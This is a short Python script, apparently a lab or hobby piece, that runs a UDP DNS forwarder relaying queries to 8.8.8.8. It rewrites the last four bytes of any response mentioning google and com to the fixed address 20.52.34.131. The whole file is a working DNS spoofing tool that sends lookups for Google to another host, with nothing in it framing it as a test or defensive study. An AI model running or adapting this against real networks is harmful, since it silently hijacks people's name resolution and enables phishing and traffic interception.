#!/bin/python3
import socket
import threading

MY_IP = "0.0.0.0"
PORT = 5354
BUFFOR_SIZE = 1000
DNS_ADDRESS = ('8.8.8.8', 53)
timeout = 10


def dns_querry(message,address,sockfd):
    dns_sockfd = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    dns_sockfd.settimeout(timeout)
    dns_sockfd.sendto(message,DNS_ADDRESS)
    try:
        (mess, add) = dns_sockfd.recvfrom(BUFFOR_SIZE)
        str_mess = str(mess)
        print(str_mess)
        if 'google' in str_mess and 'com' in str_mess:
            mess = bytearray(mess)
            mess[-4]=20
            mess[-3]=52
            mess[-2]=34
            mess[-1]=131
        if add!=DNS_ADDRESS:
            #print("Weird")
            return
        else:
            sockfd.sendto(mess,address)
            #print('Sent message')
    except socket.timeout:
        #print("Timeout exceeded")
        pass
    dns_sockfd.close()


for family,type,proto,cannonname,sockaddr in socket.getaddrinfo(MY_IP,PORT,socket.AF_INET,socket.SOCK_DGRAM):
    sockfd = socket.socket(family,type,proto)
    try:
        sockfd.bind((MY_IP,PORT))
    except socket.error:
        continue

if sockfd is None:
    raise Exception("fail to bind")

#print("server: waiting to recvfrom...")

while True:
    (message, address) = sockfd.recvfrom(BUFFOR_SIZE)
    thread = threading.Thread(target=dns_querry, args=(message,address,sockfd))
    thread.start()

sockfd.close()